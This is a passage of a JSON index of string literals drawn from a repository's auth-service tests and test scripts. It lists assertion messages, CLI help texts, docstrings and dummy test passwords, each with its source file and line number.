      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:166"
      ]
    },
    "Severity:": {
      "value": "Severity:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:331"
      ]
    },
    "Short timeout": {
      "value": "Short timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:373"
      ]
    },
    "Short1!": {
      "value": "Short1!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:36"
      ]
    },
    "Should accept JSON output format": {
      "value": "Should accept JSON output format",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:170"
      ]
    },
    "Should accept table output format (default)": {
      "value": "Should accept table output format (default)",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:162"
      ]
    },
    "Should accept token from": {
      "value": "Should accept token from",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:171"
      ]
    },
    "Should accept token when no expected issuer specified": {
      "value": "Should accept token when no expected issuer specified",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:186"
      ]
    },
    "Should be able to delete the key": {
      "value": "Should be able to delete the key",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:72"
      ]
    },
    "Should be able to set value in healthy Redis": {
      "value": "Should be able to set value in healthy Redis",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:63"
      ]
    },
    "Should be formatted for asyncpg": {
      "value": "Should be formatted for asyncpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:59",
        "auth_service/tests/test_staging_auth_ssl_failures.py:220",
        "auth_service/tests/test_staging_auth_ssl_failures.py:288"
      ]
    },
    "Should contain Cloud SQL path": {
      "value": "Should contain Cloud SQL path",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:218",
        "auth_service/tests/test_staging_auth_ssl_failures.py:285"
      ]
    },
    "Should detect staging environment for CORS config": {
      "value": "Should detect staging environment for CORS config",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:259"
      ]
    },
    "Should detect test environment during pytest run": {
      "value": "Should detect test environment during pytest run",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:300"
      ]
    },
    "Should fail gracefully when missing required arguments": {
      "value": "Should fail gracefully when missing required arguments",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:96"
      ]
    },
    "Should fail gracefully with invalid run ID": {
      "value": "Should fail gracefully with invalid run ID",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:149"
      ]
    },
    "Should fail gracefully with invalid token": {
      "value": "Should fail gracefully with invalid token",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:127"
      ]
    },
    "Should fail gracefully with non-existent repository": {
      "value": "Should fail gracefully with non-existent repository",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:140"
      ]
    },
    "Should fail when --wait-for-completion used without --workflow-name": {
      "value": "Should fail when --wait-for-completion used without --workflow-name",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:96",
        "scripts/test_verify_workflow_status_corrected.py:105"
      ]
    },
    "Should fail when missing required arguments": {
      "value": "Should fail when missing required arguments",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:89"
      ]
    },
    "Should fail when no GitHub token provided": {
      "value": "Should fail when no GitHub token provided",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:118"
      ]
    },
    "Should fail when no token provided": {
      "value": "Should fail when no token provided",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:105"
      ]
    },
    "Should fail with invalid token": {
      "value": "Should fail with invalid token",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:112"
      ]
    },
    "Should fail with non-existent repository": {
      "value": "Should fail with non-existent repository",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:121"
      ]
    },
    "Should fail with non-existent workflow": {
      "value": "Should fail with non-existent workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:130"
      ]
    },
    "Should fail:": {
      "value": "Should fail:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:178",
        "scripts/test_error_monitor_logic.py:202"
      ]
    },
    "Should gracefully degrade on Redis errors": {
      "value": "Should gracefully degrade on Redis errors",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:199"
      ]
    },
    "Should handle Cloud Run environment": {
      "value": "Should handle Cloud Run environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:411"
      ]
    },
    "Should handle exceptions gracefully": {
      "value": "Should handle exceptions gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:189"
      ]
    },
    "Should have 1 pre-deployment error": {
      "value": "Should have 1 pre-deployment error",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:223"
      ]
    },
    "Should have 2 post-deployment errors": {
      "value": "Should have 2 post-deployment errors",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:224"
      ]
    },
    "Should have failed with authentication error": {
      "value": "Should have failed with authentication error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:36"
      ]
    },
    "Should have failed with invalid token": {
      "value": "Should have failed with invalid token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1010"
      ]
    },
    "Should have raised exception": {
      "value": "Should have raised exception",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:238"
      ]
    },
    "Should indicate CSRF/state validation failure": {
      "value": "Should indicate CSRF/state validation failure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:126"
      ]
    },
    "Should normalize URL for asyncpg": {
      "value": "Should normalize URL for asyncpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:109"
      ]
    },
    "Should not contain sslmode parameter, got:": {
      "value": "Should not contain sslmode parameter, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:70"
      ]
    },
    "Should not show 'development mode' when ENVIRONMENT=staging": {
      "value": "Should not show 'development mode' when ENVIRONMENT=staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:152"
      ]
    },
    "Should not use dev instance ID in staging": {
      "value": "Should not use dev instance ID in staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:191"
      ]
    },
    "Should not validate": {
      "value": "Should not validate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:96"
      ]
    },
    "Should not validate sync": {
      "value": "Should not validate sync",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:115"
      ]
    },
    "Should preserve Cloud SQL socket path, got:": {
      "value": "Should preserve Cloud SQL socket path, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:84"
      ]
    },
    "Should preserve host, port, and database name": {
      "value": "Should preserve host, port, and database name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:54"
      ]
    },
    "Should reject None code verifier": {
      "value": "Should reject None code verifier",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:144"
      ]
    },
    "Should reject SQL injection attempts": {
      "value": "Should reject SQL injection attempts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:178"
      ]
    },
    "Should reject challenges that are too short": {
      "value": "Should reject challenges that are too short",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:116"
      ]
    },
    "Should reject empty code verifier": {
      "value": "Should reject empty code verifier",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:151"
      ]
    },
    "Should reject invalid state parameter": {
      "value": "Should reject invalid state parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:122"
      ]
    },
    "Should reject malformed challenge:": {
      "value": "Should reject malformed challenge:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:104"
      ]
    },
    "Should reject token from": {
      "value": "Should reject token from",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:177"
      ]
    },
    "Should reject unicode challenges": {
      "value": "Should reject unicode challenges",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:129"
      ]
    },
    "Should retrieve the same value": {
      "value": "Should retrieve the same value",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:66"
      ]
    },
    "Should return 503 for SSL certificate issues, got": {
      "value": "Should return 503 for SSL certificate issues, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:374"
      ]
    },
    "Should return False for invalid URL": {
      "value": "Should return False for invalid URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:143"
      ]
    },
    "Should return False for production environment when pytest not detected": {
      "value": "Should return False for production environment when pytest not detected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:253"
      ]
    },
    "Should return False for regular PostgreSQL URLs": {
      "value": "Should return False for regular PostgreSQL URLs",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:186"
      ]
    },
    "Should return None for None user": {
      "value": "Should return None for None user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:92"
      ]
    },
    "Should return True for Cloud SQL URLs": {
      "value": "Should return True for Cloud SQL URLs",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:171"
      ]
    },
    "Should return True for valid PostgreSQL URL": {
      "value": "Should return True for valid PostgreSQL URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:128"
      ]
    },
    "Should return True when ENVIRONMENT=test": {
      "value": "Should return True when ENVIRONMENT=test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:214"
      ]
    },
    "Should return True when TESTING=true": {
      "value": "Should return True when TESTING=true",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:229"
      ]
    },
    "Should return True when running under pytest": {
      "value": "Should return True when running under pytest",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:272"
      ]
    },
    "Should return empty string when DATABASE_URL not set": {
      "value": "Should return empty string when DATABASE_URL not set",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:116"
      ]
    },
    "Should return string even for malformed URL:": {
      "value": "Should return string even for malformed URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:341"
      ]
    },
    "Should return user ID without separate database sync": {
      "value": "Should return user ID without separate database sync",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:88"
      ]
    },
    "Should still contain Cloud SQL path": {
      "value": "Should still contain Cloud SQL path",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:58"
      ]
    },
    "Should store unique state parameter:": {
      "value": "Should store unique state parameter:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:209"
      ]
    },
    "Should use asyncpg driver, got:": {
      "value": "Should use asyncpg driver, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:86"
      ]
    },
    "Should use raw DATABASE_URL from environment": {
      "value": "Should use raw DATABASE_URL from environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:105"
      ]
    },
    "Should use staging defaults when DATABASE_URL not set, got:": {
      "value": "Should use staging defaults when DATABASE_URL not set, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:222"
      ]
    },
    "Should work after Redis recovery": {
      "value": "Should work after Redis recovery",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:157"
      ]
    },
    "Show detailed output for each import": {
      "value": "Show detailed output for each import",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:50"
      ]
    },
    "Show detailed real e2e test information": {
      "value": "Show detailed real e2e test information",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:167"
      ]
    },
    "Show historical category statistics": {
      "value": "Show historical category statistics",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:856"
      ]
    },
    "Show slowest tests": {
      "value": "Show slowest tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:505"
      ]
    },
    "Show warning messages": {
      "value": "Show warning messages",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:511"
      ]
    },
    "Show what would be done without making changes": {
      "value": "Show what would be done without making changes",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:234"
      ]
    },
    "Shutdown failure caused resource leak:": {
      "value": "Shutdown failure caused resource leak:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:357"
      ]
    },
    "Shutdown timeout configuration test - Expected:": {
      "value": "Shutdown timeout configuration test - Expected:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:85"
      ]
    },
    "Shutdown timeout exceeded - database connections failed to close gracefully": {
      "value": "Shutdown timeout exceeded - database connections failed to close gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:356"
      ]
    },
    "Shutdown timeout exceeded after": {
      "value": "Shutdown timeout exceeded after",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:75"
      ]
    },
    "Shutdown took": {
      "value": "Shutdown took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:78"
      ]
    },
    "Similar:": {
      "value": "Similar:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:659"
      ]
    },
    "Simple WebSocket Connectivity Test": {
      "value": "Simple WebSocket Connectivity Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:52"
      ]
    },
    "Simple WebSocket test client to verify basic connectivity.": {
      "value": "Simple WebSocket test client to verify basic connectivity.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:2"
      ]
    },
    "Simple frontend test runner": {
      "value": "Simple frontend test runner",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:74"
      ]
    },
    "Simple frontend test runner for Netra AI Platform\nMinimal dependencies for use by test_runner.py": {
      "value": "Simple frontend test runner for Netra AI Platform\nMinimal dependencies for use by test_runner.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:2"
      ]
    },
    "Simple functional test to verify WebSocket works in DEV MODE.\n\nThis script tests the actual WebSocket connection functionality by:\n1. Starting the development server\n2. Testing secure WebSocket connection\n3. Verifying bidirectional message flow\n4. Testing authentication and CORS\n5. Cleaning up resources": {
      "value": "Simple functional test to verify WebSocket works in DEV MODE.\n\nThis script tests the actual WebSocket connection functionality by:\n1. Starting the development server\n2. Testing secure WebSocket connection\n3. Verifying bidirectional message flow\n4. Testing authentication and CORS\n5. Cleaning up resources",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:2"
      ]
    },
    "Simple test fix loop - runs tests and fixes issues iteratively.": {
      "value": "Simple test fix loop - runs tests and fixes issues iteratively.",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:2"
      ]
    },
    "Simple test script to verify service startup orchestration.\nTests the core startup sequence without complex integration.": {
      "value": "Simple test script to verify service startup orchestration.\nTests the core startup sequence without complex integration.",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:2"
      ]
    },
    "Simple test to validate Auth service database URL construction for staging.\n\nThis test focuses on URL construction logic rather than actual connections,\nsince Unix socket connections cannot be tested on Windows.": {
      "value": "Simple test to validate Auth service database URL construction for staging.\n\nThis test focuses on URL construction logic rather than actual connections,\nsince Unix socket connections cannot be tested on Windows.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:1"
      ]
    },
    "SimpleAgent": {
      "value": "SimpleAgent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:157"
      ]
    },
    "SimplePass123!": {
      "value": "SimplePass123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:34"
      ]
    },
    "Simulate OAuth authentication flow": {
      "value": "Simulate OAuth authentication flow",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:216"
      ]
    },
    "Simulate a long-running background database operation.": {
      "value": "Simulate a long-running background database operation.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:180"
      ]
    },
    "Simulate complete login flow and return tokens": {
      "value": "Simulate complete login flow and return tokens",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:191"
      ]
    },
    "Simulate tests without real connections": {
      "value": "Simulate tests without real connections",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:288"
      ]
    },
    "Simulate user authentication and return tokens": {
      "value": "Simulate user authentication and return tokens",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:103"
      ]
    },
    "Simulates asyncpg connection.": {
      "value": "Simulates asyncpg connection.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:238"
      ]
    },
    "Simulates pre-deployment validation.": {
      "value": "Simulates pre-deployment validation.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:319"
      ]
    },
    "Simulating hanging database connection during disposal": {
      "value": "Simulating hanging database connection during disposal",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:51"
      ]
    },
    "Size violations addressed:": {
      "value": "Size violations addressed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:289"
      ]
    },
    "Skip environment setup (use existing environment variables)": {
      "value": "Skip environment setup (use existing environment variables)",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:87"
      ]
    },
    "Skipped:": {
      "value": "Skipped:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:327"
      ]
    },
    "Skipping": {
      "value": "Skipping",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:815"
      ]
    },
    "Slow tests that may take longer to complete": {
      "value": "Slow tests that may take longer to complete",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:99"
      ]
    },
    "Socket closure error not handled gracefully:": {
      "value": "Socket closure error not handled gracefully:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:111"
      ]
    },
    "Socket connection already closed": {
      "value": "Socket connection already closed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:213",
        "auth_service/tests/test_graceful_shutdown_failures.py:91"
      ]
    },
    "Socket error during cleanup not handled:": {
      "value": "Socket error during cleanup not handled:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:114"
      ]
    },
    "Socket reset": {
      "value": "Socket reset",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:432"
      ]
    },
    "Some tests failed - see details above": {
      "value": "Some tests failed - see details above",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:313"
      ]
    },
    "Some tests failed. Check the output above.": {
      "value": "Some tests failed. Check the output above.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:98"
      ]
    },
    "Specific files to check (default: all test files)": {
      "value": "Specific files to check (default: all test files)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:265"
      ]
    },
    "Specific module to test (e.g., netra_backend.app.services)": {
      "value": "Specific module to test (e.g., netra_backend.app.services)",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:46"
      ]
    },
    "Specific test files or directories": {
      "value": "Specific test files or directories",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:367"
      ]
    },
    "Specific test files or directories to run": {
      "value": "Specific test files or directories to run",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:480"
      ]
    },
    "Specific test files or patterns to run": {
      "value": "Specific test files or patterns to run",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:387"
      ]
    },
    "Split": {
      "value": "Split",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:362",
        "scripts/fix_all_test_issues.py:203"
      ]
    },
    "Split '": {
      "value": "Split '",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:331"
      ]
    },
    "Split from": {
      "value": "Split from",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:556"
      ]
    },
    "Split into": {
      "value": "Split into",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:113",
        "scripts/compliance/test_limits_checker.py:157",
        "scripts/compliance/test_size_validator.py:194"
      ]
    },
    "Split into multiple focused test functions or extract helper methods": {
      "value": "Split into multiple focused test functions or extract helper methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:233"
      ]
    },
    "Split large test files into smaller, focused test modules": {
      "value": "Split large test files into smaller, focused test modules",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:223"
      ]
    },
    "Split large test functions into smaller, focused tests": {
      "value": "Split large test functions into smaller, focused tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:450"
      ]
    },
    "Splitting": {
      "value": "Splitting",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:259"
      ]
    },
    "Splitting suggestions for": {
      "value": "Splitting suggestions for",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:719"
      ]
    },
    "Splitting suggestions:": {
      "value": "Splitting suggestions:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:48"
      ]
    },
    "StAgInG": {
      "value": "StAgInG",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:113"
      ]
    },
    "Staging": {
      "value": "Staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:113"
      ]
    },
    "Staging Configuration Test": {
      "value": "Staging Configuration Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:27"
      ]
    },
    "Staging Environment": {
      "value": "Staging Environment",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:142"
      ]
    },
    "Staging Environment Test Script\nVerifies that the staging environment is properly configured and all components are communicating": {
      "value": "Staging Environment Test Script\nVerifies that the staging environment is properly configured and all components are communicating",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:2"
      ]
    },
    "Staging SSL Configuration": {
      "value": "Staging SSL Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:266"
      ]
    },
    "Staging URL contains placeholder password": {
      "value": "Staging URL contains placeholder password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:77"
      ]
    },
    "Staging auth service URL should not use localhost:": {
      "value": "Staging auth service URL should not use localhost:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:356"
      ]
    },
    "Staging auth service URL should use HTTPS:": {
      "value": "Staging auth service URL should use HTTPS:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:352"
      ]
    },
    "Staging environment health check failed": {
      "value": "Staging environment health check failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1455"
      ]
    },
    "Staging environment not available": {
      "value": "Staging environment not available",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1457"
      ]
    },
    "Staging environment not available for testing": {
      "value": "Staging environment not available for testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1436"
      ]
    },
    "Staging environment not reachable": {
      "value": "Staging environment not reachable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1440",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1476"
      ]
    },
    "Staging environment specific tests": {
      "value": "Staging environment specific tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:94"
      ]
    },
    "Staging password is too short": {
      "value": "Staging password is too short",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:78"
      ]
    },
    "Staging password must be at least 8 characters": {
      "value": "Staging password must be at least 8 characters",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:208"
      ]
    },
    "Staging should not allow dev login": {
      "value": "Staging should not allow dev login",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:147"
      ]
    },
    "Staging should not allow mock auth": {
      "value": "Staging should not allow mock auth",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:148"
      ]
    },
    "Staging should not use localhost for database host": {
      "value": "Staging should not use localhost for database host",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:201"
      ]
    },
    "StagingDatabaseValidator failed to detect credential issue:": {
      "value": "StagingDatabaseValidator failed to detect credential issue:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:153"
      ]
    },
    "StagingDatabaseValidator should detect problematic 'user_pr-4' pattern": {
      "value": "StagingDatabaseValidator should detect problematic 'user_pr-4' pattern",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:114"
      ]
    },
    "Standalone Tests": {
      "value": "Standalone Tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:150",
        "scripts/compliance/test_fixer.py:151",
        "scripts/compliance/test_fixer.py:152"
      ]
    },
    "Standard pytest": {
      "value": "Standard pytest",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:105"
      ]
    },
    "Standard rename failed:": {
      "value": "Standard rename failed:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:151"
      ]
    },
    "Start all services using dev launcher.": {
      "value": "Start all services using dev launcher.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:111"
      ]
    },
    "Start test services for frontend real service testing": {
      "value": "Start test services for frontend real service testing",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:169"
      ]
    },
    "Start test services for frontend real service testing.\n\nThis script manages Docker containers and local services needed for\nrunning frontend tests against real backend services.": {
      "value": "Start test services for frontend real service testing.\n\nThis script manages Docker containers and local services needed for\nrunning frontend tests against real backend services.",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:2"
      ]
    },
    "Start the development server.": {
      "value": "Start the development server.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:48"
      ]
    },
    "Starting": {
      "value": "Starting",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:142"
      ]
    },
    "Starting 100 test iterations...": {
      "value": "Starting 100 test iterations...",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:101"
      ]
    },
    "Starting Docker services...": {
      "value": "Starting Docker services...",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:42"
      ]
    },
    "Starting E2E test import fixing...": {
      "value": "Starting E2E test import fixing...",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:192"
      ]
    },
    "Starting WebSocket DEV MODE functional tests...": {
      "value": "Starting WebSocket DEV MODE functional tests...",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:260"
      ]
    },
    "Starting Workflow Status Verification Tests": {
      "value": "Starting Workflow Status Verification Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:196"
      ]
    },
    "Starting automated test fix loop...": {
      "value": "Starting automated test fix loop...",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:96"
      ]
    },
    "Starting comprehensive fake test scan...": {
      "value": "Starting comprehensive fake test scan...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:51"
      ]
    },
    "Starting comprehensive test import fix...": {
      "value": "Starting comprehensive test import fix...",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:264"
      ]
    },
    "Starting database test...": {
      "value": "Starting database test...",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:17"
      ]
    },
    "Starting development server...": {
      "value": "Starting development server...",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:50"
      ]
    },
    "Starting local backend services...": {
      "value": "Starting local backend services...",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:95"
      ]
    },
    "Starting long-running database operation": {
      "value": "Starting long-running database operation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:252"
      ]
    },
